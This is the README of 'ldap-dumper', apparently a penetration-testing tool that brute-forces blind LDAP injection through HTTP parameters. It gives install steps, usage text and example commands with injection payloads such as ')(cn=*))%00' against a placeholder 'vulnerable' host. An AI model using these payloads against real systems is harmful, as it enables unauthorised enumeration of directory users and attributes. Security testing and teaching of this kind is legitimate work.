Ldap dumper is a semi-fast tool to bruteforce unescaped user-input
concatenations to [LDAP filters](http://www.ietf.org/rfc/rfc1960.txt) over HTTP
parameters.

# Installation

```
git clone git@github.com:droope/ldap-brute.git
cd ldap-brute/
pip install -r requirements.txt
```

# Usage

```
usage: ldap-dumper.py [-h]
                      [--charset {lower_and_digit,upperlower_and_digits,upperlower_hex,digits,lower}]
                      [--verbosity VERBOSITY]
                      [--charset-custom CHARSET_CUSTOM] [--no-wildcard]
                      [--brute-attr] [--max-path-size MAX_PATH_SIZE]
                      [--attribute-name ATTRIBUTE_NAME]
                      [--max-word-size MAX_WORD_SIZE | --exact-word-size EXACT_WORD_SIZE]
                      URL TRUE_STRING

Bruteforces LDAP!

positional arguments:
  URL                   The URL that is vulnerable to LDAP injection, with a
                        %s where the injection is.
  TRUE_STRING           A string that appears in the response if LDAP says
                        True. If string doesnt appear, false is assumed.

optional arguments:
  -h, --help            show this help message and exit
  --charset {lower_and_digit,upperlower_and_digits,upperlower_hex,digits,lower}, -c {lower_and_digit,upperlower_and_digits,upperlower_hex,digits,lower}
                        The set of characters the script will attempt to use
                        while bruteforcing.
  --verbosity VERBOSITY, -v VERBOSITY
                        0 warn, 1 info, 2 debug
  --charset-custom CHARSET_CUSTOM, -C CHARSET_CUSTOM
                        A custom string that contains all the charcters to
                        use. E.g. '-C ABC389'
  --no-wildcard, -N     Some LDAP values do not honor the wildcard. These need
                        to be bruteforced without a wildcard, which is much
                        slower.
  --brute-attr, -A      Bruteforce attribute names instead of values. Similar
                        to -N, but it bruteforces attributes instead. All
                        options that only work with non-wildcard also work
                        with this
  --max-path-size MAX_PATH_SIZE
                        For non-wildcard only: for bruteforcing DN names,
                        which don't support wildcards, we create massive
                        filters like (!(val=value1)(val=value2))[...] to be
                        more efficient. This defines how long requests will
                        be.
  --attribute-name ATTRIBUTE_NAME, -a ATTRIBUTE_NAME
                        Required for non-wildcard bruteforcing.
  --max-word-size MAX_WORD_SIZE
                        For wildcard only: the max max length we are going to
                        attempt to bruteforce.
  --exact-word-size EXACT_WORD_SIZE
                        For wildcard only: The exact length of the string we
                        are going to bruteforce.

Example:

python ldap-dumper.py 'http://vulnerable/ldap/example2.php?name=%s)(cn=*))%%00&password=' 'AUTHENTICATED as'

In this example, we inserted an expression into the param that will always
return true if the parameter replaced by %s is true, in this case ennumerating
all valid users. Your mission is to get an LDAP that will return TRUE-STRING
when %s is TRUE, and will not return it when FALSE.

Strings inserted look like 'a*', 'b*', 'c*'

Non-wildcard example:

python ldap-dumper.py --no-wildcard -a gidNumber -c 'digits' --max-word-size 5 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'

Some LDAP attributes do not support wildcards, in which case you should use
--no-wildcard. In this example, note how the %s needs to be placed right at the
end of an always-true filter and its respective close parenthesis.

Strings inserted look like
"(|(gidNumber=0)(gidNumber=1)(gidNumber=2)(gidNumber=3)(gidNumber=4))..."
(trimmed for brevity)

Bruteforcing attributes:

python ldap-dumper.py -A -c lower --max-word-size=4 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'

Recommend only using -c 'lower', since using digits can cause invalid
attributes (like '9c') to be mixed with valid attributes, which is not handled
properly at all.

NOTE: Remember to quote the URL because bash! And also remember that % needs to
be escaped as %%, because python/printf.

CAVEAT: in wildcard search, if there are two users that begin with the same
string, but one is larger than the other, only the largest one will be
returned. E.g. if both admin and admin2 exist, when bruting in wildcard mode,
only admin2 will be returned.

Plase see for more info:

https://code.google.com/p/ldap-blind-explorer/
https://www.owasp.org/index.php/LDAP_injection
http://web-for-pentester.pentesterlab.com/examples_of_web_vulnerabilities/ldap_attacks/
http://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf
http://www.ietf.org/rfc/rfc1960.txt
```
